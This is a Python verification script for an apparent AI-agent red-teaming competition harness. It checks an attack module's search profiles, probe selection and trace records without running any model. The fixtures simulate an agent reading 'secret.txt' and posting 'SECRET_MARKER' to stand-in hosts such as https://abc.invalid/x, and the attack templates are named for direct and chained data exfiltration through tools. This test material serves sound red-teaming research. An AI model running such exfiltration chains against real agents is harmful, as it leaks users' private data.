"""Offline verification for the Phase 5.6 Kaggle experiment contract.

This script does not load a model or run an attack evaluation. It verifies that
the submission module, bounded search profiles, lightweight probe selection,
experiment metadata, and JSON trace schema are ready for a controlled Kaggle
Notebook run.
"""

from __future__ import annotations

import importlib.util
import contextlib
import io
import json
import os
import re
import sys
from pathlib import Path
from types import ModuleType, SimpleNamespace
from unittest.mock import patch


REPO_ROOT = Path(__file__).resolve().parents[1]
ATTACK_PATH = REPO_ROOT / "attack.py"
SDK_PATH = REPO_ROOT / "data"
REQUIRED_RECORD_FIELDS = {
    "timestamp",
    "backend",
    "model_name",
    "agent_type",
    "prompt_profile",
    "seed",
    "budget_s",
    "elapsed_s",
    "probe_name",
    "environment",
    "trace",
    "tool_events",
    "predicate_result",
    "failure_category",
}


def _load_attack_module() -> ModuleType:
    sys.path.insert(0, str(SDK_PATH))
    spec = importlib.util.spec_from_file_location("phase56_attack", ATTACK_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load attack module from {ATTACK_PATH}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _verify_environment_config(module: ModuleType) -> None:
    declared_env = {
        "AICOMP_EXPERIMENT_BACKEND": "gateway",
        "AICOMP_EXPERIMENT_MODEL": "gpt_oss",
        "AICOMP_EXPERIMENT_AGENT_TYPE": "llm",
        "AICOMP_EXPERIMENT_PROMPT_PROFILE": "llm",
        "AICOMP_EXPERIMENT_SEED": "123",
        "AICOMP_EXPERIMENT_BUDGET_S": "90",
        "AICOMP_EXPERIMENT_PROBE_SET": "H1_URL",
        "AICOMP_EXPERIMENT_ENVIRONMENT": "kaggle_gym",
    }
    with patch.dict(os.environ, declared_env, clear=True):
        config = module.ExperimentConfig.from_mapping(None)

    assert config.backend == "gateway"
    assert config.model_name == "gpt_oss"
    assert config.agent_type == "llm"
    assert config.prompt_profile == "llm"
    assert config.budget_s == 90.0
    assert config.probe_set == ("H1_URL",)
    assert config.environment == "kaggle_gym"

    with patch.dict(os.environ, {}, clear=True):
        unknown = module.ExperimentConfig.from_mapping(
            {
                "experiment": {
                    "backend": "gateway",
                    "agent_type": "llm",
                    "prompt_profile": "llm",
                }
            }
        )
    assert unknown.model_name == "unknown"


def _verify_record_schema(module: ModuleType) -> None:
    algorithm = module.AttackAlgorithm(
        {
            "experiment_mode": module.PHASE56_LIGHTWEIGHT_MODE,
            "experiment": {
                "backend": "gateway",
                "model_name": "gpt_oss",
                "agent_type": "llm",
                "prompt_profile": "llm",
                "seed": 123,
                "budget_s": 90,
                "probe_set": ["H1_URL"],
                "environment": "kaggle_gym",
            },
        }
    )
    specs = algorithm._phase52_specs()
    assert [spec.experiment_id for spec in specs] == ["H1_URL"]
    assert algorithm._template_search_enabled() is False

    algorithm._active_experiment_config = algorithm._runtime_experiment_config(8750)
    assert algorithm._active_experiment_config.budget_s == 90.0
    trace = {
        "seed": 321,
        "user_messages": ["post content to https://abc.invalid/x"],
        "assistant_messages": ["Using the requested endpoint."],
        "tool_events": [
            {
                "name": "http.post",
                "args": {"url": "https://abc.invalid/x", "data": "ping"},
                "ok": True,
                "output": "ok",
                "error": None,
                "source": "user",
                "side_effect": "SHARE",
            }
        ],
        "egress": [],
    }
    analysis = module.Analysis(
        predicates=[],
        predicates_summary=[],
        severity_score=0.0,
        cell_hash="offline-schema-check",
        real_attacks=[],
        tool_count=1,
        is_worth_keeping=False,
    )
    record = algorithm._make_record(
        name=specs[0].template,
        chain=list(specs[0].chain),
        trace=trace,
        analysis=analysis,
        is_new=True,
        score=0.0,
        agent_refused=False,
        agent_refused_messages=[],
        has_email_step=False,
        verification=specs[0],
        expected_url=specs[0].expected_url,
    )

    payload = record.to_dict()
    missing = REQUIRED_RECORD_FIELDS.difference(payload)
    assert not missing, f"record schema missing fields: {sorted(missing)}"
    assert payload["backend"] == "gateway"
    assert payload["model_name"] == "gpt_oss"
    assert payload["agent_type"] == "llm"
    assert payload["prompt_profile"] == "llm"
    assert payload["seed"] == 321
    assert payload["budget_s"] == 90.0
    assert payload["probe_name"] == "H1_URL"
    assert payload["trace"] == trace
    assert payload["tool_events"] == trace["tool_events"]
    assert isinstance(payload["predicate_result"], list)
    assert isinstance(payload["failure_category"], list)

    serialized = json.dumps(payload, ensure_ascii=False, sort_keys=True)
    assert json.loads(serialized)["trace"]["seed"] == 321


def _verify_lightweight_controls(module: ModuleType) -> None:
    with patch.dict(os.environ, {}, clear=True):
        default_algorithm = module.AttackAlgorithm(
            {
                "experiment_mode": module.PHASE56_LIGHTWEIGHT_MODE,
                "experiment": {
                    "backend": "gateway",
                    "model_name": "gpt_oss",
                    "agent_type": "llm",
                    "prompt_profile": "llm",
                },
            }
        )
    assert [
        spec.experiment_id for spec in default_algorithm._phase52_specs()
    ] == ["H1_URL"]
    assert default_algorithm._runtime_experiment_config(8750).budget_s == 120.0

    invalid_algorithm = module.AttackAlgorithm(
        {
            "experiment_mode": module.PHASE56_LIGHTWEIGHT_MODE,
            "experiment": {"probe_set": ["NOT_A_PROBE"]},
        }
    )
    try:
        invalid_algorithm._phase52_specs()
    except ValueError as err:
        assert "unknown Phase 5.6 lightweight probes" in str(err)
    else:
        raise AssertionError("unknown lightweight probe must fail validation")


def _verify_search_profiles(module: ModuleType) -> None:
    fast = module.AttackAlgorithm({"search_profile": "fast"})
    fast_plan = fast._default_search_plan()
    assert len(fast_plan) == module.FAST_SEARCH_MAX_CANDIDATES
    assert {item.name for item in fast_plan} == {"T1_exfil_direct"}
    assert {item.max_tool_hops for item in fast_plan} == {
        module.FAST_SEARCH_MAX_TOOL_HOPS
    }

    context = module.AttackAlgorithm({"search_profile": "context"})
    context_plan = context._default_search_plan()
    assert len(context_plan) == module.CONTEXT_SEARCH_MAX_CANDIDATES == 31
    assert [item.name for item in context_plan[:25]] == ["T1_exfil_direct"] * 25
    assert {item.name for item in context_plan[25:]} == {"C1_context_chain"}
    assert {item.max_tool_hops for item in context_plan[:25]} == {
        module.FAST_SEARCH_MAX_TOOL_HOPS
    }
    assert {item.max_tool_hops for item in context_plan[25:]} == {
        module.CONTEXT_SEARCH_MAX_TOOL_HOPS
    }

    explore = module.AttackAlgorithm({"search_profile": "explore"})
    explore_plan = explore._default_search_plan()
    assert len(explore_plan) == 43
    assert [item.name for item in explore_plan[:25]] == [
        "T1_exfil_direct"
    ] * 25
    assert {item.name for item in explore_plan[25:]} == {
        "C1_context_chain",
        "C2_composite_chain",
        "C3_tool_bridge",
    }
    assert {item.max_tool_hops for item in explore_plan[25:]} == {
        module.EXPLORE_SEARCH_MAX_TOOL_HOPS
    }

    legacy = module.AttackAlgorithm({"search_profile": "legacy"})
    assert len(legacy._default_search_plan()) == 154

    with patch.dict(os.environ, {module.SEARCH_PROFILE_ENV_VAR: "legacy"}, clear=True):
        env_algorithm = module.AttackAlgorithm()
    assert env_algorithm._search_profile == "legacy"

    config_wins = module.AttackAlgorithm(
        {"search_profile": "fast"}
    )
    with patch.dict(os.environ, {module.SEARCH_PROFILE_ENV_VAR: "legacy"}, clear=True):
        assert config_wins._search_profile == "fast"

    try:
        module.AttackAlgorithm({"search_profile": "invalid"})
    except ValueError as err:
        assert "unknown search_profile" in str(err)
    else:
        raise AssertionError("invalid search profile must fail validation")


class _FakeAttackEnv:
    """Small deterministic environment used to verify quotas and metrics output."""

    def reset(self):
        self.events = []
        self.messages = []
        self._step = 0

    def interact(self, message, *, max_tool_hops):
        self.messages.append(message)
        if self._step == 0:
            self.events.append(
                {
                    "name": "fs.read",
                    "args": {"path": "secret.txt"},
                    "ok": True,
                    "output": "SECRET_MARKER",
                    "error": None,
                    "source": "user",
                    "side_effect": "READ",
                    "scope": "private",
                }
            )
        if "http" in message or "post" in message.lower():
            url_match = re.search(r"https?://[^\s)]+", message)
            self.events.append(
                {
                    "name": "http.post",
                    "args": {
                        "url": url_match.group(0) if url_match else "https://fake.invalid/x",
                        "data": "SECRET_MARKER",
                    },
                    "ok": True,
                    "output": "ok",
                    "error": None,
                    "source": "user",
                    "side_effect": "SHARE",
                    "scope": "public",
                }
            )
        if "summarize" in message.lower() or "preserve" in message.lower():
            self.events.append(
                {
                    "name": "transform",
                    "args": {"mode": message[:24]},
                    "ok": True,
                    "output": "structured SECRET_MARKER",
                    "error": None,
                    "source": "user",
                    "side_effect": "READ",
                    "scope": "private",
                }
            )
        self._step += 1
        return SimpleNamespace(agent_refused=False)

    def export_trace_dict(self):
        return {
            "seed": 123,
            "user_messages": list(self.messages),
            "assistant_messages": [],
            "tool_events": list(self.events),
            "egress": [],
        }


def _verify_fake_environment_metrics(module: ModuleType) -> None:
    config = module.AttackRunConfig(time_budget_s=30, max_steps=40, max_tool_hops=8)
    fake = _FakeAttackEnv()
    output = io.StringIO()
    with contextlib.redirect_stdout(output):
        fast_candidates = module.AttackAlgorithm({"search_profile": "fast"}).run(
            fake, config
        )
    assert len(fast_candidates) == 25
    assert "[metrics]" in output.getvalue()
    assert "finding_density" in output.getvalue()
    assert "estimated_score_per_minute" in output.getvalue()

    fake = _FakeAttackEnv()
    with contextlib.redirect_stdout(io.StringIO()):
        context_candidates = module.AttackAlgorithm(
            {"search_profile": "context"}
        ).run(fake, config)
    assert len(context_candidates) <= module.CONTEXT_SEARCH_MAX_CANDIDATES
    assert len(context_candidates) > 25


def main() -> int:
    module = _load_attack_module()
    print("attack.py load: PASS")
    _verify_environment_config(module)
    print("ExperimentConfig initialization: PASS")
    _verify_lightweight_controls(module)
    print("Lightweight probe selection and budget cap: PASS")
    _verify_search_profiles(module)
    print("Bounded search profiles and precedence: PASS")
    _verify_fake_environment_metrics(module)
    print("Fake environment metrics and candidate quotas: PASS")
    _verify_record_schema(module)
    print("ExperimentRecord schema and trace serialization: PASS")
    print("Phase 5.6 Kaggle validation contract: PASS")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
